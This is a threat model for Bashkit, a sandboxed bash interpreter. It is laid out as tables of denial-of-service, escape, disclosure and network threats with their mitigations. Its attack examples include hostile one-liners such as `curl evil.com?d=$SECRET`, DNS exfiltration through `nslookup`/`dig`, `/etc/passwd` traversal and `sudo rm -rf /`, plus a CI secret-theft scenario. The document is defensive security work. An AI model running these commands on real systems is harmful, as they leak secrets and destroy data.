# Threat Model

Bashkit is designed to execute untrusted bash scripts safely in virtual environments.
This document describes the security threats we address and how they are mitigated.

**See also:**

## Overview

Bashkit assumes all script input is potentially malicious. The virtual environment prevents:

- **Resource exhaustion** (CPU, memory, disk)
- **Sandbox escape** (filesystem, process, privilege)
- **Information disclosure** (secrets, host info)
- **Network abuse** (exfiltration, unauthorized access)

## Threat Categories

### Denial of Service (TM-DOS-*)

Scripts may attempt to exhaust system resources. Bashkit mitigates these attacks
through configurable limits.

**Memory Exhaustion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large input (TM-DOS-001) | 1GB script | `max_input_bytes` limit (10MB) | MITIGATED |
| Output flooding (TM-DOS-002) | `yes \| head -n 1000000000` | Command limit stops loop | MITIGATED |
| Width-derived allocation (TM-DOS-103) | `printf x \| od -w1152921504606846976` | Reject widths above 65,536 bytes; stack-pad one numeric field; budget output capacity before fallible growth | MITIGATED |
| Variable explosion (TM-DOS-003) | `x=$(cat /dev/urandom)` | /dev/urandom returns bounded 8KB | MITIGATED |
| Array growth (TM-DOS-004) | `arr+=(element)` in loop | Command limit | MITIGATED |

| Deep Agents VFS search amplification (TM-DOS-113) | Dense matching files or a broad recursive `grep`/`glob` bypass shell execution limits and amplify into host objects | Grep caps results at 1,000 matches and 100 KB of matched text; line scans stream; every direct walk carries a per-operation deadline, 10,000-file and 10 MB traversal budget, and a cancellation flag the async workers set | **MITIGATED** |
| Symlink loops (TM-DOS-011) | `ln -s /a /b; ln -s /b /a` | At most 40 links per lookup, then "Too many levels of symbolic links" | MITIGATED |

| TOCTOU append (TM-DOS-034) | Concurrent appends bypass limits | Single write lock | **FIXED** |
| OverlayFs upper-only check (TM-DOS-035) | `check_write_limits()` ignores lower layer | Combined limit accounting | **MITIGATED** |
| OverlayFs double-count (TM-DOS-036) | `compute_usage()` counts overwritten files | Subtract overrides | **MITIGATED** |
| OverlayFs chmod CoW bypass (TM-DOS-037) | chmod writes to unlimited upper | Route through `check_write_limits()` | **MITIGATED** |

**Loops and CPU:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| While true (TM-DOS-016) | `while true; do :; done` | Loop limit (10K) | MITIGATED |
| For loop (TM-DOS-017) | `for i in $(seq 1 inf)` | Loop limit | MITIGATED |
| Nested loops (TM-DOS-018) | Double for loop | `max_total_loop_iterations` (1M) | MITIGATED |

| Regex backtrack (TM-DOS-025) | `grep "a](*b)*c" file` | Regex crate limits | PARTIAL |
| AWK unbounded loops (TM-DOS-033) | `BEGIN { while(1){} }`, nested loops, deep recursion | Per-loop and whole-program loop caps from `ExecutionLimits`, call-depth cap; all fatal (exit 2) | MITIGATED |
| awk commands (TM-DOS-128) | `system()`, `print \| cmd` or `cmd \| getline` in a loop | Each command runs as `sh -c` in the sandbox shell under the session's command budget and timeout; awk's loop, output and getline caps still apply | MITIGATED |
| Command hash table growth (TM-DOS-129) | `hash -p FILE name...` retains arbitrary path copies; many distinct PATH commands | Names, paths and entry metadata own live-byte budget leases before allocation; persistent entries are charged again for each execution and forks share their payloads. The table also holds at most 512 entries; assigning `PATH` empties it | MITIGATED |
| Array and arithmetic reports (TM-DOS-130) | `$((` nested in arithmetic, many `${a[-9]}` reads, huge `${!r}` target | 32 nesting levels; warnings capped at 64 KiB per command; indirect target echoed truncated to 256 chars | MITIGATED |

| Completion specs and bindings (TM-DOS-132) | `complete`/`bind` in a loop | 1024 specs (64 KiB each) and 1024 binding changes (4 KiB each) per interpreter; never shared between instances | MITIGATED |

**Stack Overflow / Recursion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Function recursion (TM-DOS-020) | `f() { f; }; f` | Depth limit of 16, including a hard ceiling when callers request more, protects 2 MiB host stacks | MITIGATED |
| Command sub depth (TM-DOS-021) | `$($($($())))` nesting | Inherited depth/fuel from parent | MITIGATED |
| Parser depth (TM-DOS-022) | `(((((...))))))` nesting | `max_ast_depth` + hard cap (100) | MITIGATED |

| Python read-only self-mount recursion (TM-DOS-118) | `bash.mount("/", bash.fs(), read_only=True)` hides the live filesystem identity behind a wrapper | Python validates the resolved filesystem identity before wrapping it | MITIGATED |
| find traversal amplification (TM-DOS-121) | `find -L` over a symlink cycle, unbounded `-exec ... {} +` batches, or `*`-heavy `-name` patterns | Canonical-path loop detection with a 40-hop symlink cap, budget-charged directory listings, capped output, batches flushed every 4096 paths, linear-time glob matching | MITIGATED |
| Background job flooding (TM-DOS-122) | `while :; do sleep 99 & done` holds unbounded concurrent interpreters | `max_background_jobs` (64 default, 16 hardened) caps live jobs; extra `&` fails like bash's fork EAGAIN; jobs share the session budget, timeout and cancellation; every job is reaped when `exec()` returns | MITIGATED |

**Parser and Arithmetic:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Parser hang (TM-DOS-024) | Malformed input | `parser_timeout` + `max_parser_operations` | MITIGATED |
| Diff DoS (TM-DOS-028) | `diff` on large unrelated files | LCS matrix cap (10M cells) | MITIGATED |
| Parser limit bypass (TM-DOS-030) | eval/source ignore limits | `Parser::with_limits()` | **FIXED** |
| Arithmetic overflow (TM-DOS-029) | `$(( 2 ** -1 ))` | Use wrapping arithmetic | **MITIGATED** |
| ExtGlob blowup (TM-DOS-031) | `+(a\|aa)` exponential | Depth limit plus a shared per-match step budget | **MITIGATED** |
| Tokio runtime exhaustion (TM-DOS-032) | Rapid `execute_sync()` calls | Shared runtime | **MITIGATED** |

| parse_word_string limits (TM-DOS-050) | Parameter expansion ignores limits | Propagate limits | **MITIGATED** |
| Removed YAML helper parser (TM-DOS-051) | Former custom parser recursed over indentation | Parser deleted; yq uses TM-DOS-101 controls | **REMOVED** |
| Template engine recursion (TM-DOS-052) | Nested `{{#if}}`/`{{#each}}` overflow | Add depth limit | **MITIGATED** |
| Template output explosion (TM-DOS-053) | `{{#each}}` on large array | Bounded by `max_file_size` | MITIGATED |
| glob ExtGlob blowup (TM-DOS-054) | `glob --files "+(a\|aa)"` | Same as TM-DOS-031 | **MITIGATED** |
| split file count (TM-DOS-055) | `split -l 1 bigfile` | FS `max_file_count` limit | MITIGATED |
| source self-recursion (TM-DOS-056) | Script that sources itself | Track source depth | **MITIGATED** |
| sleep bypasses timeout (TM-DOS-057) | `sleep N` ignores `ExecutionLimits::timeout` | Host-backed timeout; non-JS wasm blocking sleep is clamped to the execution deadline | **MITIGATED** |
| Interactive terminal flooding (TM-DOS-119) | Unbounded type-ahead, undrained output, or a `vi` buffer grown by pastes | Caps on unread input (1 MiB), retained output (4 MiB), scrollback (1000 rows), transcript (1 MiB), line length, `vi` buffer (8 MiB) and undo history; `:w` goes through VFS limits | MITIGATED |
| Input wait vs. timeout (TM-DOS-120) | Abusing the keyboard-wait exclusion to run work past the deadline | Only time blocked reading the terminal is excluded; CPU work and `sleep` still count | MITIGATED |
| Concurrent pipeline amplification (TM-DOS-124) | An endless loop piped into `head`, a producer whose reader quit, or recursive pipelines `f() { f \| f; }` | 4 KiB pipes with backpressure; a writer whose reader is gone ends with 141 (SIGPIPE); streaming nesting counts toward `max_subshell_depth` and falls back to sequential stages past 4 levels; stages share the session budget, timeout and cancellation | MITIGATED |
| make amplification (TM-DOS-126) | Exponential recursive variables, self-including makefiles, deep `$(MAKE)` recursion, huge graphs | Expansion depth 200 and 4 MiB per expansion; include depth 16; target, query and glob caps per run; `$(MAKE)` stops at level 4; recipes run under the session budget and timeout | MITIGATED |
| Random generator amplification (TM-DOS-123) | `openssl rand` asked for gigabytes | Requests capped at 1 MiB; fixed-size `uuidgen`/`$SRANDOM` | MITIGATED |
| Child-shell recursion (TM-DOS-125) | Script that re-runs itself via `sh` | Child shells count against function depth, max 8 nested | MITIGATED |
| Pattern substitution (TM-DOS-127) | `${x//*a*/b}` over a long value | Globs run as a size-capped linear-time regex; extglob search capped at 10,000 attempts | MITIGATED |
| Unbounded builtin output (TM-DOS-058) | `seq 1 1000000` produces 1M lines | Add `max_stdout_bytes` limit | **MITIGATED** |
| Silent truncation at builtin caps (TM-DOS-109) | `seq 200000`, an awk loop past its cap, or an oversized `sprintf` expression returns incomplete output with exit 0 | Caps report `<cmd>: <what> limit (<N>) exceeded` on stderr and exit non-zero; awk caps and formatting errors are fatal | **MITIGATED** |
| In-builtin memory growth (TM-DOS-110) | `awk 'BEGIN { s = "x"; while (1) s = s s }'` or `jq -n '"x" \| until(false; . + .)'` allocates until the host aborts | awk checks each string against a 16 MiB cap before allocating it, caps `$N` field indexes, and caps total variable memory at `max_live_intermediate_bytes` (fatal, exit 2). jq meters every live string, array and object against the same limit and fails before growing (exit 5); non-emitting jq loops and pure recursion stop at the timeout; non-tail recursion hits a live-context ceiling (64) before host stack exhaustion | **MITIGATED** |
| Arrays bypass the retained-memory budget (TM-DOS-114) | Ten array slots each holding a 4 MiB string retain ~40 MB past the 10 MB variable-byte budget | Array keys and values charge `max_total_variable_bytes` alongside scalars, are released on unset/replacement/scope pop, and an over-budget write fails execution. Pending indexed compound-assignment keys, values, fields and containers also hold shared intermediate-memory leases, including repeated subscripts | **MITIGATED** |
| `$(<file)` resource-accounting bypass (TM-DOS-115) | Repeated file-read substitutions skip command limits and accumulate file contents during argument expansion | Optimized reads charge command, session-command, and work budgets; file and accumulated substitution bytes hold live-intermediate leases | **MITIGATED** |
| Silent scalar assignment rejection (TM-DOS-111) | A variable write over the byte or count limit is dropped while the script exits 0 | The first rejected write fails execution with a memory-limit error; a later exec can reuse the session | **MITIGATED** |
| AWK `close()` recycles getline read quotas (TM-DOS-116) | `getline x < file; close(file)` in a loop reloads the same large VFS file while retained-cache accounting returns to zero | Every cache miss charges the shared aggregate-input and work budgets before decoding the file; `close()` still releases retained cache bytes but cannot refund either charge | **MITIGATED** |
| `sed r` output amplification (TM-DOS-112) | `sed 'r FILE' FILE` re-emits the whole file after every input line, growing output quadratically inside the engine | Every sed sink leases from `max_live_intermediate_bytes` before growing; a refused lease is `sed: <error>` with exit 1. The stdout *capture* cap is deliberately not a sink limit, since sed output is often piped onward or redirected to a file | **MITIGATED** |
| Newline-dense head/tail input (TM-DOS-117) | A small line selection over a newline-dense file builds an offset for every line | Line selection scans from the nearest end and stores no per-line offset collection | **MITIGATED** |
| Param expansion bomb (TM-DOS-059) | `${x//a/bigstring}` multiplicative amplification | `max_total_variable_bytes` + `max_stdout_bytes` | MITIGATED |
| Sparse array huge-index (TM-DOS-060) | `arr[999999999]=x` | HashMap storage; `max_array_entries` | MITIGATED |
| Snapshot restore bypasses function/parser limits (TM-DOS-061) | Crafted snapshot with oversized/deep function bodies | Re-parse restored function source under current limits; re-check function memory budget | MITIGATED |
| Persistent fd exhaustion (TM-DOS-063) | `exec N>/tmp/f` across many `N` values, or `cmd {v}>/tmp/f` in a loop | `max_file_descriptors` caps custom persistent descriptors | MITIGATED |

**Configuration:**
```rust
use bashkit::{Bash, ExecutionLimits, FsLimits, InMemoryFs};
use std::sync::Arc;
use std::time::Duration;

# fn main() {
let limits = ExecutionLimits::new()
    .max_commands(10_000)
    .max_loop_iterations(10_000)
    .max_function_depth(16)
    .timeout(Duration::from_secs(30))
    .max_input_bytes(10_000_000);  // 10MB

let fs_limits = FsLimits::new()
    .max_total_bytes(100_000_000)  // 100MB
    .max_file_size(10_000_000)     // 10MB per file
    .max_file_count(10_000);

let fs = Arc::new(InMemoryFs::with_limits(fs_limits));
let bash = Bash::builder()
    .limits(limits)
    .fs(fs)
    .build();
# }

| Suspended host-call retention (TM-DOS-098) | Script repeats event-backed calls or host never resumes one | Capacity-one channel; an independently driven execution future keeps the deadline armed while parked and drops the timed-out session without another host poll; handle drop aborts the driver | MITIGATED |

| yq structured-data amplification (TM-DOS-101) | Deep/multi-document YAML or JSON, runaway filters, expanded output | Parser depth and 4096-document caps, aggregate budgets, shared jaq work/deadline/output limits, final render cap | MITIGATED |
| Archive decoder pre-allocation (TM-DOS-102) | Compressed output grows before memory checks | Validate and charge each decoder chunk before reserve/copy | MITIGATED |

| Zip creation pre-allocation (TM-DOS-106) | Recursive inputs and encoded output allocate before live-memory checks | Collect paths only, lease file sizes before VFS reads, and encode through a budget-aware byte buffer | MITIGATED |

### Sandbox Escape (TM-ESC-*)

Scripts may attempt to break out of the sandbox to access the host system.

**Filesystem Escape:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Path traversal (TM-ESC-001) | `cat /../../../etc/passwd` | Path normalization | MITIGATED |
| Symlink escape (TM-ESC-002) | `ln -s /etc/passwd /tmp/x` | Links resolve to VFS paths only; real-mount containment still applies to the result | MITIGATED |
| Real FS access (TM-ESC-003) | Direct syscalls | No real FS by default | MITIGATED |
| Mount escape (TM-ESC-004) | Mount real paths | MountableFs controlled by caller | MITIGATED |
| VFS limit bypass (TM-ESC-012) | `add_file()` skips limits | Restrict API visibility | **MITIGATED** |
| OverlayFs upper() exposed (TM-ESC-013) | `upper()` returns unlimited FS | Restrict visibility | **MITIGATED** |
| Custom builtins lost (TM-ESC-014) | `std::mem::take` empties builtins | Arc-cloned builtins | **FIXED** |
| Symlink overlay rename (TM-ESC-016) | `ln -s /etc/passwd x; mv x y` | Overlay rename/copy preserve symlinks | **FIXED** |
| Namespace source-root or policy escape (TM-ESC-031) | `..` escapes a rebased or nested mount | Normalize before longest-prefix selection; join only the stripped suffix; enforce both mutation endpoints | MITIGATED |
| Windows host-path namespace escape (TM-ESC-033) | Drive/UNC/device path or reparse point discards the RealFS root | Normalize into the POSIX VFS root; canonicalize existing ancestors; component-aware root check; Windows CI | MITIGATED |
| Host mount resolver traversal (TM-ESC-034) | `/workspace/../secret` passed to `host_path_for` keeps an unnormalized suffix that escapes the selected host mount when joined | Normalize mount points and lookup paths with the shared POSIX VFS normalizer before longest-prefix selection and host joining | MITIGATED |

**Process Escape:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Shell escape (TM-ESC-005) | `exec /bin/bash` | Re-enters the in-process interpreter; host binaries are unreachable (exit 127) | MITIGATED |
| External commands (TM-ESC-006) | `./malicious` | Runs in VFS sandbox, no host shell | MITIGATED |
| Background proc (TM-ESC-007) | `malicious &` | Background not implemented | MITIGATED |
| eval injection (TM-ESC-008) | `eval "$input"` | Sandboxed eval (builtins only) | MITIGATED |
| bash/sh re-invoke (TM-ESC-015) | `bash -c "malicious"` | Sandboxed re-invocation | MITIGATED |

**Privilege Escalation:**

| Threat | Attack Example | Mitigation | Status |

| sudo/su (TM-ESC-009) | `sudo rm -rf /` | Not implemented | MITIGATED |
| setuid (TM-ESC-010) | Permission changes | Virtual FS, no real perms | MITIGATED |
| Capability abuse (TM-ESC-011) | Linux capabilities | Runs in-process | MITIGATED |
| Mount-rw exposure to untrusted automation (TM-ESC-030) | Running untrusted scripts with `--mount-rw /` | CLI docs mark `--mount-rw` sandbox-breaking; recommend `--mount-ro` when host access is needed | MITIGATED |
| Permission gate built on static analysis (TM-ESC-032) | `c=rm; $c -rf /data` passes an allowlist check that only reads `analysis.commands` | `analyze()` reports unresolved names as `null` and sets `is_opaque()`; pair it with the `before_tool` hook, which sees the resolved name, see the [script analysis guide](./script-analysis.md) | MITIGATED (advisory API) |

**Virtual Filesystem:**

Bashkit uses an in-memory virtual filesystem by default. Scripts cannot access the
real filesystem unless explicitly mounted via [`MountableFs`] or composed into a
bounded [`NamespaceFs`].

```rust
use bashkit::{Bash, InMemoryFs, MountableFs};
use std::sync::Arc;

# fn main() {
// Default: fully isolated in-memory filesystem
let bash = Bash::new();

// Custom filesystem with explicit mounts (advanced)
let root = Arc::new(InMemoryFs::new());
let fs = Arc::new(MountableFs::new(root));
// fs.mount("/data", Arc::new(InMemoryFs::new()));  // Mount additional filesystems
# }
```

### Information Disclosure (TM-INF-*)

| System info (TM-INF-008) | `uname -a` | Returns configurable virtual values | MITIGATED |
| User ID (TM-INF-009) | `id` | Returns hardcoded uid=1000 | MITIGATED |
| Date/time (TM-INF-018) | `date`, `touch -t` | Real time can correlate executions; host timezone could fingerprint the runtime | UTC is the closed default; only sandbox `TZ` selects a static IANA zone; invalid/unsupported values and naive touch stamps use UTC; `fixed_epoch` / `epoch_offset` virtualize the clock | **MITIGATED** |
| Command timing (TM-INF-033) | `time` as a high-resolution oracle or source of host CPU/RSS data | Portable monotonic/virtual clock; Hardened profile floors to 100 ms; host-process fields are explicitly `unavailable` | **MITIGATED** |

**Network Exfiltration:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| HTTP exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | MITIGATED |
| DNS exfil (TM-INF-011) | `nslookup $SECRET.evil.com` | No DNS commands | MITIGATED |
| Timing channel (TM-INF-012) | Response time variations | Accepted (minimal risk) | ACCEPTED |

**Other Disclosure:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env via `$__bashkit_env__` | **FIXED** |
| Real PID leak (TM-INF-014) | `$$` returns real PID | Returns virtual PID (1) | **FIXED** |
| URL creds in errors (TM-INF-015) | Allowlist error echoes full URL | Apply URL redaction | **MITIGATED** |
| Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **MITIGATED** |
| Internal markers leak (TM-INF-017) | `set` / `declare -p` show internals | Filter `is_internal_variable()` | **MITIGATED** |
| envsubst exposes env (TM-INF-019) | `envsubst` substitutes any `$VAR` | Caller controls env (same as TM-INF-001) | CALLER RISK |
| template exposes env (TM-INF-020) | `{{var}}` falls back to env | Caller controls env (same as TM-INF-001) | CALLER RISK |

**Build / CI Pipeline:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Fork-PR secret exfil (TM-INF-026) | Fork PR edits `examples/*.rs` or `build.rs` to read `$DOPPLER_TOKEN` / `$ANTHROPIC_API_KEY` from the runner env and exfiltrate; first-time-contributor approval gate runs the workflow from PR head, and `DOPPLER_TOKEN` is the master key to every other secret in the Doppler config | Trusted-run gates exclude PR execution from secret-backed examples. Dedicated fetch steps in `.github/workflows/{ci,js,publish-js}.yml` request one API key, mask it, and exit before build/example execution. Execution steps receive only that scoped key; Docker inherits it by name, without a secret value in argv. Neither the execution shell nor a live Doppler parent retains the broad service token. This protects process environments on a trusted runner; it does not sandbox dependencies persisting across steps. Workflow-script regression tests check child/parent environments. CI has contents-read permission only and does not persist checkout credentials anywhere they could reach untrusted code (TM-INF-034); release examples install the reviewed lockfile without lifecycle scripts before linking the built artifact | **FIXED** |

**Additional information-disclosure hardening:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Library Debug shapes leak via stderr (TM-INF-022) | `{:?}` dumps internal struct shapes into agent-visible stderr; separately, a diagnostic that quotes the script back can run past the 1 KB stderr budget — an arithmetic error named both the whole expression and the whole unparsed rest, echoing one input back twice over | Static scan forbids Debug formatting in builtins, plus per-tool leak tests and fuzz invariants. Each run of script text echoed into an arithmetic diagnostic is capped (`MAX_ARITHMETIC_DIAG_ECHO`), so the text that says what went wrong always survives (L-ARITH-002) | MITIGATED |
| jq `halt`/`halt_error` exits the host process (TM-INF-023) | Filter calls `halt(N)` → `std::process::exit` | Upstream `halt` native stripped; safe replacement returns a jq error | MITIGATED |
| Host env side-channel via clap `Arg::env` (TM-INF-024) | `ls` resolved `TABSIZE`/`TIME_STYLE` from host env | Codegen strips `.env(...)`; builtins read `ctx.env` only | MITIGATED |
| Untrusted generated Rust in drift CI (TM-INF-025) | Malicious upstream `uu_app()` runs with a write token | Generator validates the emitted shape; drift workflow splits read/write privilege | FIXED |
| Checkout token readable by untrusted CI code (TM-INF-034) | `actions/checkout` leaves `GITHUB_TOKEN` in `.git/config`, where a dependency build script or test in the same job can read it | `persist-credentials: false` on every checkout that does not back an authenticated `git`/`gh` call, and on every job of a pull-request-triggered workflow; every workflow declares a read-only default `permissions` block | FIXED |
| Publish from unverified release refs (TM-INF-027) | Dispatch publish from a branch or unprotected tag | Dispatch requires `refs/heads/main`; publish gated on real `vX.Y.Z` tags | FIXED |
| JS `onOutput` errors expose host stack traces (TM-INF-028) | Callback throws, leaking `error.stack` | Propagate `error.message` only; strip absolute/`file://` paths | FIXED |
| Raw callback errors leak host internals (TM-INF-030) | Tool callback throws API keys/connection strings/stack traces | `sanitize_errors` defaults on for `ScriptedTool`/`ToolImpl`/`ToolRegistry` across shell/Python/TypeScript | MITIGATED |
| `final_env` capture bypasses filtering/caps (TM-INF-031) | `capture_final_env` leaks internal markers or exceeds caps | Visibility filter + output-byte cap applied when building `final_env` | MITIGATED |
| Imported competitor fixture executes upstream code (TM-INF-032) | Automated import runs a compromised upstream script in CI | Fixtures are manually reviewed, checked-in JSON; CI never fetches upstream; host-Bash execution requires an explicit oracle | MITIGATED |
| Stack backtrace disclosure (TM-INF-021) | Panics leak source paths, dep versions, function names via stderr | Custom panic hook suppresses backtraces in the CLI | MITIGATED |

**Caller Responsibility (TM-INF-001):**

Do NOT pass sensitive environment variables to untrusted scripts:

```rust
# use bashkit::Bash;
// UNSAFE - secrets may be leaked
let bash = Bash::builder()
    .env("DATABASE_URL", "postgres://user:pass@host/db")
    .env("API_KEY", "sk-secret-key")
    .build();

// SAFE - only pass non-sensitive variables
let bash = Bash::builder()
    .env("HOME", "/home/user")
    .env("TERM", "xterm")
    .build();
```

**System Information:**

System builtins return configurable virtual values, never real host information:

```rust
# use bashkit::Bash;
let bash = Bash::builder()
    .username("sandbox")         // whoami returns "sandbox"
    .hostname("bashkit-sandbox") // hostname returns "bashkit-sandbox"
    .build();
```

### Network Security (TM-NET-*)

Network access is disabled by default. When enabled, strict controls apply.

**DNS:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| DNS spoofing (TM-NET-001) | Resolve to wrong IP | No DNS resolution | MITIGATED |
| DNS rebinding (TM-NET-002) | Rebind after allowlist check | Literal host matching | MITIGATED |
| DNS exfiltration (TM-NET-003) | `dig secret.evil.com` | No DNS commands | MITIGATED |

**Network Bypass:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| IP instead of host (TM-NET-004) | `curl http://93.184.216.34` | Literal IP blocked unless allowed | MITIGATED |
| Port scanning (TM-NET-005) | `curl http://internal:$port` | Port must match allowlist | MITIGATED |
| Protocol downgrade (TM-NET-006) | HTTPS to HTTP | Scheme must match | MITIGATED |
| Subdomain bypass (TM-NET-007) | `evil.example.com` | Exact host match | MITIGATED |

**HTTP Attacks:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large response (TM-NET-008) | 10GB download | Size limit (10MB) | MITIGATED |
| Connection hang (TM-NET-009) | Server never responds | Connect timeout (10s) | MITIGATED |
| Slowloris (TM-NET-010) | Slow response dripping | Read timeout (30s) | MITIGATED |
| Redirect bypass (TM-NET-011) | `Location: http://evil.com` | No auto-redirect | MITIGATED |
| Chunked bomb (TM-NET-012) | Infinite chunked response | Response size limit (streaming) | MITIGATED |
| Compression bomb (TM-NET-013) | 10KB to 10GB gzip | Auto-decompression disabled | MITIGATED |
| DNS rebind via redirect (TM-NET-014) | Redirect to rebinded IP | Redirect requires allowlist check | MITIGATED |
| JSON body injection (TM-NET-018) | `http POST url name='x","admin":true'` | Build JSON via `serde_json`, not string formatting | MITIGATED |
| Query param injection (TM-NET-019) | `http GET url q=='foo&admin=true'` | URL-encode via local x-www-form-urlencoded encoder | MITIGATED |
| Form body injection (TM-NET-020) | `http --form url user='x&role=admin'` | URL-encode form fields | MITIGATED |
| Bot identity spoofing (TM-NET-021) | Forge requests as a trusted bot | Ed25519 request signing (bot-auth feature, opt-in) | MITIGATED |
| IPv4-mapped IPv6 SSRF bypass (TM-NET-022) | AAAA returns `::ffff:127.0.0.1` / metadata IP | `is_private_ip` normalizes v4-mapped/compatible v6 to v4 and applies the v4 classifier | FIXED |
| HTTP-transport SSRF via fail-open precheck (TM-NET-023) | Malformed/no-host URL or rebind window bypasses the IP filter | Precheck fails closed on bad URLs; transports receive pinned addresses + `is_private_ip` | MITIGATED |
| Repeated curl data bypasses body cap (TM-NET-028) | Many data/file parts plus encoding expansion exceed 10 MB in aggregate | Checked aggregate appends; file metadata checked against remaining capacity before reads | MITIGATED |
| Private IP behind NAT64/6to4 or reserved range (TM-NET-029) | AAAA `64:ff9b::a9fe:a9fe` / `2002:7f00:1::`, or A in `0.0.0.0/8`, `198.18.0.0/15`, multicast | `is_private_ip` checks the embedded IPv4 of NAT64/6to4 and blocks all non-global special-purpose ranges | MITIGATED |

**Credential Injection (TM-NET-024–027):**

Per-host HTTP credentials injected by the embedding host without exposing the
secret to the script (see `knowledge/security/credential-injection.md`).

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Real credential exposed to script (TM-NET-024) | Script reads env var for the secret | Injection mode keeps the secret out of the script env; placeholder mode exposes only a random placeholder replaced on the wire | MITIGATED |
| Credential exfiltrated to unapproved host (TM-NET-025) | Send credential to attacker host | Injection scoped to allowlist patterns; substitution only for matching destinations | MITIGATED |
| `Authorization` spoofing (TM-NET-026) | Script sets competing same-name header | Overwrite semantics, injected headers replace script-set headers | MITIGATED |
| Credential leak in errors/traces (TM-NET-027) | Value surfaces in error or trace log | Redacted on all error paths; traces show `[CREDENTIAL]`; `Credential` `Debug` redacts values | MITIGATED |

**Availability, Fail-Open Auth (TM-AVAIL-001):**

Bot-auth signing and credential injection fail **open**: a transient signing or
injection failure sends the request unsigned / without the credential rather
than aborting it. Security enforcement (allowlist, SSRF precheck) still runs;
only the optional auth augmentation is skipped. Accepted trade-off, the
destination enforces its own authentication.

**Network Allowlist:**

```rust,ignore
use bashkit::{Bash, NetworkAllowlist};

// Explicit allowlist - only these URLs can be accessed
let allowlist = NetworkAllowlist::new()
    .allow("https://api.example.com")
    .allow("https://cdn.example.com/assets/");

let bash = Bash::builder()
    .network(allowlist)
    .build();

// Scripts can now use curl/wget, but only to allowed URLs
// curl https://api.example.com/data  → allowed
// curl https://evil.com              → blocked (exit 7)
```

**Domain Allowlist (TM-NET-015, TM-NET-016):**

For simpler domain-level control, `allow_domain()` permits all traffic to a domain
regardless of scheme, port, or path. This is the virtual equivalent of SNI-based
egress filtering, the same approach used by production sandbox environments.

```rust,ignore
use bashkit::{Bash, NetworkAllowlist};

// Domain-level: any scheme, port, or path to these hosts
let allowlist = NetworkAllowlist::new()
    .allow_domain("api.example.com")
    .allow_domain("cdn.example.com");

// Both of these are allowed:
// curl https://api.example.com/v1/data
// curl http://api.example.com:8080/health
```

Trade-off: domain rules intentionally skip scheme and port enforcement. Use URL
patterns (`allow()`) when you need tighter control. Both can be combined.

**No Wildcard Subdomains (TM-NET-017):**

Wildcard patterns like `*.example.com` are not supported. They would enable data
exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.com`).

### Injection Attacks (TM-INJ-*)

| Redirect target re-expansion (TM-INJ-026) | `> $v` with a value holding `$(...)` text or a glob | A target is expanded once; zero or several words are `ambiguous redirect` and nothing is written; the result is used literally afterwards | MITIGATED |

**Variable Expansion:**

Variables expand to literal strings, not re-parsed as commands:

```bash
# If user_input contains "; rm -rf /"
user_input="; rm -rf /"
echo $user_input
# Output: "; rm -rf /" (literal string, NOT executed)
```

### Multi-Tenant Isolation (TM-ISO-*)

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Shared filesystem (TM-ISO-001) | Access other tenant files | Separate Bash instances | MITIGATED |
| Shared memory (TM-ISO-002) | Read other tenant data | Rust memory safety | MITIGATED |
| Resource starvation (TM-ISO-003) | One tenant exhausts limits | Per-instance limits | MITIGATED |

| Trap handler leakage (TM-ISO-008) | Trap from session A fires in B | Per-instance trap HashMap | MITIGATED |

| Exit code leakage (TM-ISO-013) | `$?` from session A visible in B | Per-instance `last_exit_code` | MITIGATED |
| Concurrent variable leakage (TM-ISO-014) | Race condition leaks vars | Per-instance state, no shared mutables | MITIGATED |
| Concurrent FS leakage (TM-ISO-015) | Race condition leaks files | Separate `Arc<FileSystem>` per instance | MITIGATED |
| Snapshot/restore side effects (TM-ISO-016) | `restore_shell_state()` affects others | Snapshot is per-instance | MITIGATED |
| Adversarial variable probing (TM-ISO-017) | Enumerate common secret var names | Default-empty env, no host env inheritance | MITIGATED |

| Stale request authority and retained host-extension handles (TM-ISO-027) | A late runtime/transport/callback result crosses completion, or a builtin/tool keeps VFS or request context past completion/cancellation | Shared request budget plus one revocable capability lease, cancellation-aware awaits, deterministic late-use failure, RAII closure/release, and explicit `insert_trusted` escape hatch | **MITIGATED** |
| Process substitution shared through the VFS (TM-ISO-028) | Tenants on one filesystem read or clobber each other's `<(cmd)` data at `/dev/fd/63` | `/dev/fd/N` (N >= 3) resolves in each interpreter's own fd namespace; nothing reaches the shared filesystem | **MITIGATED** |

Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
separate instances per tenant:

```rust
use bashkit::{Bash, InMemoryFs};
use std::sync::Arc;

# fn main() {
// Each tenant gets completely isolated instance
let tenant_a = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Separate filesystem
    .build();

let tenant_b = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Different filesystem
    .build();

// tenant_a cannot access tenant_b's files or state
# }
```

### Internal Error Handling (TM-INT-*)

Bashkit is designed to never crash, even when processing malicious or malformed input.
All unexpected errors are caught and converted to safe, human-readable messages.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Builtin panic (TM-INT-001) | Trigger panic in builtin | `catch_unwind` wrapper | MITIGATED |
| Info leak in panic (TM-INT-002) | Panic exposes secrets | Sanitized error messages | MITIGATED |
| Date format crash (TM-INT-003) | Invalid strftime: `+%Q` | Pre-validation | MITIGATED |
